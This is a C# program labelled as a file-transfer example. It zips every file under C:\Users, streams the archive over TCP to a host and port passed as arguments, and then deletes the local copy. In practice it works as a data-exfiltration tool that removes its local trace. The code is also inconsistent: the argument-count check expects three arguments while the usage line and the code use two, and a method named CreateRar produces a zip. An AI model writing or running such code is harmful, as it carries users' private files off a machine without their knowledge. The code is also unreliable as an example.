using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.IO.Compression;

namespace FileTransferExample
{
    class Program
    {
        static void CreateRar(string dirPath, string rarPath)
        {
            using (FileStream fsOut = new FileStream(rarPath, FileMode.Create))
            {
                using (ZipArchive archive = new ZipArchive(fsOut, ZipArchiveMode.Create))
                {
                    foreach (string filePath in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
                    {
                        ZipArchiveEntry entry = archive.CreateEntryFromFile(filePath, filePath.Substring(dirPath.Length + 1));
                    }
                }
            }
        }

        static void SendFile(string host, int port, string filePath)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);

            using (NetworkStream stream = client.GetStream())
            {
                using (FileStream fileStream = File.OpenRead(filePath))
                {
                    byte[] fileSizeBytes = BitConverter.GetBytes(fileStream.Length);
                    stream.Write(fileSizeBytes, 0, fileSizeBytes.Length);

                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        stream.Write(buffer, 0, bytesRead);
                    }
                }
            }

            client.Close();
        }

        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: FileTransferExample <host> <port>");
                return;
            }

            string dirPath = @"C:\Users";
            string rarPath = "snapshot.zip";
            string host = args[0];
            int port = int.Parse(args[1]);

            CreateRar(dirPath, rarPath);
            SendFile(host, port, rarPath);

            File.Delete(rarPath);

            Console.WriteLine("File transfer completed.");
        }
    }
}
